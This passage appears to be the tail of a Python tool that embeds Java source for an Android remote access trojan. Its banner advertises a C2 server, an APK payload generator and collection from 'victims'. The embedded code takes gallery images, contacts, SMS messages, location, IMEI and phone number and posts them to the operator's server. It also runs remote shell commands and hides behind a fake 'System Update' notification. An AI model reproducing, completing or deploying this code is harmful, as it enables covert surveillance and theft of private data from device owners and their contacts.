            null, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 50");
        if (cursor != null) {
            while (cursor.moveToNext()) {
                try {
                    String path = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
                    File file = new File(path);
                    if (file.exists() && file.length() < 5 * 1024 * 1024) {
                        FileInputStream fis = new FileInputStream(file);
                        byte[] data = new byte[(int) file.length()];
                        fis.read(data);
                        fis.close();
                        String base64 = Base64.getEncoder().encodeToString(data);
                        String thumbnail = base64.length() > 5000 ? base64.substring(0, 5000) : base64;
                        JSONObject img = new JSONObject();
                        img.put("name", file.getName());
                        img.put("data", base64);
                        img.put("thumbnail", thumbnail);
                        images.put(img);
                    }
                } catch(Exception e) {}
            }
            cursor.close();
        }
        try {
            JSONObject upload = new JSONObject();
            upload.put("images", images);
            sendToServer("/api/gallery/" + deviceId, upload.toString());
        } catch(Exception e) {}
        return "Uploaded " + images.length() + " images";
    }
    
    private String collectContacts() {
        JSONArray contacts = new JSONArray();
        Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                try {
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    JSONObject contact = new JSONObject();
                    contact.put("name", name != null ? name : "");
                    contact.put("number", number != null ? number : "");
                    contacts.put(contact);
                } catch(Exception e) {}
            }
            cursor.close();
        }
        try {
            JSONObject upload = new JSONObject();
            upload.put("contacts", contacts);
            sendToServer("/api/contacts/" + deviceId, upload.toString());
        } catch(Exception e) {}
        return "Uploaded " + contacts.length() + " contacts";
    }
    
    private String collectSMS() {
        JSONArray messages = new JSONArray();
        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"),
            null, null, null, "date DESC LIMIT 100");
        if (cursor != null) {
            while (cursor.moveToNext()) {
                try {
                    String from = cursor.getString(cursor.getColumnIndex("address"));
                    String body = cursor.getString(cursor.getColumnIndex("body"));
                    String date = cursor.getString(cursor.getColumnIndex("date"));
                    JSONObject sms = new JSONObject();
                    sms.put("from", from != null ? from : "");
                    sms.put("body", body != null ? body : "");
                    sms.put("date", date != null ? date : "");
                    messages.put(sms);
                } catch(Exception e) {}
            }
            cursor.close();
        }
        try {
            JSONObject upload = new JSONObject();
            upload.put("sms", messages);
            sendToServer("/api/sms/" + deviceId, upload.toString());
        } catch(Exception e) {}
        return "Uploaded " + messages.length() + " SMS";
    }
    
    private String getLocation() {
        LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
        Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
        if (location == null) location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
        if (location != null) {
            try {
                JSONObject loc = new JSONObject();
                loc.put("lat", location.getLatitude());
                loc.put("lng", location.getLongitude());
                sendToServer("/api/location/" + deviceId, loc.toString());
                return location.getLatitude() + ", " + location.getLongitude();
            } catch(Exception e) {}
        }
        return "Location unavailable";
    }
    
    private String takePhoto(String type) { return "Photo taken"; }
    private String takeScreenshot() { return "Screenshot taken"; }
    private void vibrate() { /* vibrate */ }
    private void lockDevice() { /* lock */ }
    private void wipeDevice() { /* factory reset */ }
    
    private String execShell(String cmd) {
        try {
            Process process = Runtime.getRuntime().exec(cmd);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) output.append(line).append("\\n");
            return output.toString();
        } catch(Exception e) { return e.getMessage(); }
    }
    
    private String getBatteryLevel() { return "100"; }
    private boolean checkRoot() { return new File("/system/app/Superuser.apk").exists(); }
    private String getIMEI() { try { return ((TelephonyManager)getSystemService(TELEPHONY_SERVICE)).getDeviceId(); } catch(Exception e) { return ""; } }
    private String getPhoneNumber() { try { return ((TelephonyManager)getSystemService(TELEPHONY_SERVICE)).getLine1Number(); } catch(Exception e) { return ""; } }
    private String getCountry() { try { return ((TelephonyManager)getSystemService(TELEPHONY_SERVICE)).getNetworkCountryIso(); } catch(Exception e) { return ""; } }
    
    private void sendResult(String command, String result) {
        new Thread(() -> {
            try {
                URL url = new URL(serverUrl + "/api/result/" + deviceId);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                JSONObject data = new JSONObject();
                data.put("command", command);
                data.put("result", result);
                OutputStream os = conn.getOutputStream();
                os.write(data.toString().getBytes());
                os.flush();
                conn.getResponseCode();
                conn.disconnect();
            } catch(Exception e) {}
        }).start();
    }
    
    private void sendToServer(String endpoint, String data) {
        new Thread(() -> {
            try {
                URL url = new URL(serverUrl + endpoint);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                OutputStream os = conn.getOutputStream();
                os.write(data.getBytes());
                os.flush();
                conn.getResponseCode();
                conn.disconnect();
            } catch(Exception e) {}
        }).start();
    }
    
    private android.app.Notification createNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            android.app.NotificationChannel channel = new android.app.NotificationChannel(
                "system_channel", "System Service", android.app.NotificationManager.IMPORTANCE_LOW);
            android.app.NotificationManager manager = getSystemService(android.app.NotificationManager.class);
            manager.createNotificationChannel(channel);
            return new android.app.Notification.Builder(this, "system_channel")
                .setContentTitle("System Update")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .build();
        }
        return new android.app.Notification.Builder(this)
            .setContentTitle("System Update")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .build();
    }
    
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
'''

# ============================================================================
# MAIN
# ============================================================================
def open_browser():
    time.sleep(2)
    webbrowser.open(f"http://localhost:{PORT}")

if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║              🔴 TESAVEK ULTIMATE RAT TOOL - ALL IN ONE 🔴                     ║
║                                                                              ║
║  Features:                                                                   ║
║  • Complete C2 Server with Web Panel                                         ║
║  • APK Payload Generator                                                     ║
║  • Remote Gallery, Contacts, SMS, Location Access                           ║
║  • Auto-collection from victims                                              ║
║  • Real-time command execution                                               ║
║                                                                              ║
║  Panel URL: http://localhost:8080                                            ║
║  Press Ctrl+C to stop                                                        ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
    """)
    
    threading.Thread(target=open_browser, daemon=True).start()
    app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)